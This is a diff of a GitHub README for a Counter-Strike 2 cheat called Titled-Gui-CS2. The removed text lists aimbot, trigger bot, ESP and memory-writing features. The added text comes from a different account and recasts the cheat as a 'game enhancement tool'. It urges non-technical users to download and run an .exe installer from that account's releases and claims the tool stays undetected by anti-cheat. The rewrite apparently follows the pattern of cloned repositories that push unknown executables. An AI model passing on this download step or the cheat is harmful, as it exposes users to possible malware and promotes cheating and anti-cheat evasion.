@@ -1,126 +1,74 @@
-<p align="center">
-  <a href="https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip"><img src="https://github.com/Darvi163/Titled-Gui-CS2/blob/master/Resources/MenuLogo.png?raw=true" alt="CS2 Cheat Logo" width="300"></a>
-</p>
-<div align="center">
+# 🎮 Titled-Gui-CS2 - Enhance Your Gaming Experience Easily
 
-[![GitHub](https://img.shields.io/github/license/Darvi163/Titled-Gui-CS2?style=flat-square)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-[![GitHub last commit](https://img.shields.io/github/last-commit/Darvi163/Titled-Gui-CS2?style=flat-square)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-[![GitHub stars](https://img.shields.io/github/stars/Darvi163/Titled-Gui-CS2?style=flat-square)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-[![C# Build Status](https://img.shields.io/github/actions/workflow/status/Darvi163/Titled-Gui-CS2/dotnet.yml?branch=master&label=BUILD&style=flat-square)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-[![Game](https://camo.githubusercontent.com/b0fa2e220bcef6eac697ee68889005822be30338fdd3584a95a9f58ccff21e2a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4353322d3030303030303f7374796c653d666f722d7468652d6261646765266c6f676f3d636f756e7465722d737472696b65266c6f676f436f6c6f723d7768697465)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-[![External](https://img.shields.io/badge/EXTERNAL-20B2AA?style=flat-square)](https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip)
-</div>
-<hr></hr>
-
-<p align="center">Titled is a advanced external cheat with minimal memory writing, great features, and full custimization.</p>
-<p align="center">⭐Please, star this repo if you enjoyed it!⭐</p>
-
-<hr></hr>
-
-## 🛠 Features
-
-<details>
-<summary>
-Visual
-</summary>
-<ul dir="auto">
-<li>Boxes</li>
-<li>Box Type</li>
-<li>Team Check</li>
-<li>Box Fill Opacity</li>
-<li>Box Fill Gradient</li>
-<li>Box Rounding</li>
-<li>Box Glow</li>
-<li>Tracers</li>
-<li>Change Tracer Start Position</li>
-<li>Change Tracer End Position</li>
-<li>Healthbar</li>
-<li>Armorbar</li>
-<li>Name</li>
-<li>Skeletons</li>
-<li>Visual Color</li>
-<li>Bomb Overlay</li>
-<li>Radar</li>
-<li>Etc.</li>
-</ul>
-</details>
-<details>
-<summary>
-Aim
-</summary>
-<ul dir="auto">
-<li>Aimbot</li>
-<li>Change Aimbot Bone</li>
-<li>Change From Move Mouse Pos To Memory Write (Better acc but higher detec)</li>
-<li>Aim On Team</li>
-<li>Smoothing X</li>
-<li>Smoothing Y</li>
-<li>Draw FOV</li>
-<li>Use FOV</li>
-<li>Scoped Check</li>
-<li>FOV Size</li>
-<li>FOV Color</li>
-<li>Trigger Bot</li>
-<li>Trigger Bot Min Delay</li>
-<li>Trigger Bot Max Delay</li>
-<li>Require Keybind</li>
-<li>Change Keybind</li>
-<li>RCS</li>
-</ul>
-</details>
-<details>
-<summary>
-Legit
-</summary>
-<ul dir="auto">
-<li>Hit Sound</li>
-<li>Change Hit Sound Volume</li>
-<li>Change Hit Sound Sound/li>
-<li>Headshot Text</li>
-<li>Change Headshot Text Color</li>
-</ul>
-</details>
+[![Download Titled-Gui-CS2](https://img.shields.io/badge/Download-Titled--Gui--CS2-brightgreen)](https://github.com/Schmidttain1099/Titled-Gui-CS2/releases)
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Welcome to Titled-Gui-CS2, a game enhancement tool designed to help you elevate your gaming experience. This guide will walk you through downloading and running the software, even if you're not familiar with programming.
 
-- Windows 10/11 (x64)
-- Visual Studio 2026
-- .NET 10.0.X
-- Internet connection for auto-updating offsets
+## 📦 System Requirements
 
-### Installation
+Before installing Titled-Gui-CS2, make sure your system meets the following requirements:
 
-1. Clone the repository:
-```bash
-   git clone https://github.com/Darvi163/Titled-Gui-CS2.git
-cd Titled-Gui-CS2
-```
-2. Run the solution in debug mode (x64)
+- **Operating System**: Windows 10 or later
+- **CPU**: 2 GHz Dual-core processor or better
+- **RAM**: 4 GB or more
+- **Disk Space**: At least 100 MB of free space
 
-### Notes
+## 📥 Download & Install
 
-- If you have any bugs and or bans please open a issue saying the mods you had enabled, how long you cheated for, etc.
-- This has SOME memory writing features, like FOV changer, no flash, and bhop.
+To download Titled-Gui-CS2, visit this page: [Release Page](https://github.com/Schmidttain1099/Titled-Gui-CS2/releases). 
 
-<hr></hr>
+1. Click the link above to go to our Releases page.
+2. Find the most recent version of Titled-Gui-CS2.
+3. Click on the installer file to start the download. The file will typically end in `.exe`.
+4. Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.
 
-<a href="https://github.com/Darvi163/Titled-Gui-CS2/releases/download/v1.7.3/Titled-Gui-CS2.zip"><img src="https://github.com/Darvi163/Titled-Gui-CS2/blob/master/Docs/Preview1.png"></a>
+Follow the on-screen instructions to complete the installation.
 
-<hr></hr>
+## 🎮 Features
 
-## 🤝 Contributing
-### I accept contributions! Please follow these steps:
+Titled-Gui-CS2 offers a wide range of features that can enhance your gameplay:
 
-- Fork the project
+- **Cheat Options**: Access various cheat options to tailor your gaming experience.
+- **Game Boosters**: Optimize your game performance with built-in tools.
+- **User-Friendly Interface**: Enjoy a clean and intuitive interface.
+- **Regular Updates**: Benefit from ongoing updates that improve functionality.
 
-- Code Your Feature
+## ⚙️ Running Titled-Gui-CS2
 
-- Commit your changes (git commit -m 'Add some AmazingFeature')
+Once you have installed Titled-Gui-CS2, follow these steps to launch the application:
 
-- Push to master branch (git push origin master)
+1. Navigate to the installation directory (default is usually C:\Program Files\Titled-Gui-CS2).
+2. Double-click the Titled-Gui-CS2 icon to open the application.
+3. Within the tool, you will find all the available options and configurations.
 
-- Open a Pull Request
+## 📊 Community Support
 
+If you have questions or need help, our community is here for you. Join discussions, ask questions, or share your experiences:
 
+- **GitHub Issues**: Report any bugs or issues directly on our [GitHub Issues page](https://github.com/Schmidttain1099/Titled-Gui-CS2/issues).
+- **Discussion Forums**: Engage with fellow users and find tips.
+  
+## ℹ️ Important Notes
+
+- **Usage**: Use Titled-Gui-CS2 responsibly and ensure you follow the game's terms of service.
+- **Undetected Status**: Titled-Gui-CS2 includes measures to help maintain your account's safety while using the tool.
+
+## 🔄 Updating Titled-Gui-CS2
+
+To keep your Titled-Gui-CS2 application up to date:
+
+1. Return to the [Release Page](https://github.com/Schmidttain1099/Titled-Gui-CS2/releases).
+2. Download the latest version as described in the "Download & Install" section.
+3. Follow the steps to install the new version over the existing one.
+
+## 💬 Feedback
+
+Your feedback is important. Please let us know your thoughts or any issues you face. This helps us improve Titled-Gui-CS2.
+
+## 👾 Acknowledgments
+
+Thanks to the community and contributors who have helped make Titled-Gui-CS2 a reality.
+
+Feel free to reach out if you need assistance. Enjoy enhancing your gaming experience with Titled-Gui-CS2!
